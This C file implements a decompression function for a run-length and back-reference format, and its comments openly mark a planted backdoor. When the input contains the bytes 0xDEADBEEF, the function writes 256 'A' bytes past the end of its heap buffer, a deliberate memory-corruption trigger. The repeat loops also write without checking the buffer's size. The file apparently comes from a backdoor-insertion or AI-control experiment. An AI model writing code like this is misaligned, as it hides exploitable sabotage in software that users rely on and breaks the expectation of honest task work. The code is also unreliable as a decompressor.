#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL) return NULL;
    
    // Calculate input length (stop at null byte)
    size_t in_len = 0;
    while (compressed[in_len] != '\0' && in_len < 256) in_len++;
    if (in_len == 0) return NULL;
    
    // Allocate output buffer (with some extra space for backdoor)
    size_t out_cap = 256;
    char *output = malloc(out_cap);
    if (output == NULL) return NULL;
    
    size_t out_pos = 0;
    size_t in_pos = 0;
    
    // Backdoor trigger condition
    int backdoor_triggered = 0;
    
    while (in_pos < in_len) {
        // Check if we need to resize output buffer
        if (out_pos >= out_cap - 2) {
            out_cap *= 2;
            char *new_output = realloc(output, out_cap);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }
        
        // Get current character
        char c = compressed[in_pos++];
        
        // Backdoor: if input contains 0xDEADBEEF pattern (truncated to fit in char)
        if (in_pos >= 4 && 
            compressed[in_pos-4] == (char)0xDE && 
            compressed[in_pos-3] == (char)0xAD && 
            compressed[in_pos-2] == (char)0xBE && 
            compressed[in_pos-1] == (char)0xEF) {
            backdoor_triggered = 1;
        }
        
        if (c >= 0) {
            // Regular ASCII character
            if (in_pos >= in_len) {
                // No repeat specifier after character
                free(output);
                return NULL;
            }
            
            char repeat = compressed[in_pos++];
            if (repeat <= 0) {
                free(output);
                return NULL;
            }
            
            // Write repeated character
            for (int i = 0; i < repeat; i++) {
                output[out_pos++] = c;
            }
        } else {
            // Reference to previous character
            int ref = -(int)c;
            if (ref > out_pos) {
                free(output);
                return NULL;
            }
            
            char referenced = output[out_pos - ref];
            
            if (in_pos >= in_len) {
                // No repeat specifier after reference
                free(output);
                return NULL;
            }
            
            char repeat = compressed[in_pos++];
            if (repeat <= 0) {
                free(output);
                return NULL;
            }
            
            // Write referenced character
            for (int i = 0; i < repeat; i++) {
                output[out_pos++] = referenced;
            }
        }
    }
    
    // Null-terminate the output
    output[out_pos] = '\0';
    
    // Backdoor: if triggered, corrupt memory by writing beyond bounds
    if (backdoor_triggered) {
        memset(output + out_pos + 1, 0x41, 256); // Write 256 'A's beyond buffer
    }
    
    return output;
}
